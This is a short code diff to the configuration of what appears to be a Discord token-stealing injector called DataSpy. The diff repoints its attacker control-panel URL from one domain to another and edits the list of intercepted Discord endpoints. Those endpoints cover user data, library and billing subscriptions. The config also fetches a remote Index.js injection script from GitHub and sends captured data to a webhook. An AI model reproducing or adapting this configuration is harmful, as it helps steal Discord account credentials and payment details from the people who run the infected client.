@@ -18,7 +18,8 @@ var config = {
     creator: "%NAME_CREATOR%",
     injection_url: "https://raw.githubusercontent.com/DataSpyGithub/DataSpyGithub/main/Index.js",
     webhook: "%WEBHOOK%",
-    uwu: "https://panel.dataspy.com:3000/",
+    uwu: "https://panel.sordeal.com:3000/",
+
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -28,7 +29,6 @@ var config = {
             "https://discord.com/api/v*/users/@me/library",
             "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
             "https://discord.com/api/v*/users/@me/billing/subscriptions",
-            "wss://remote-auth-gateway.discord.gg/*"
         ]
     },
     onCompleted: {
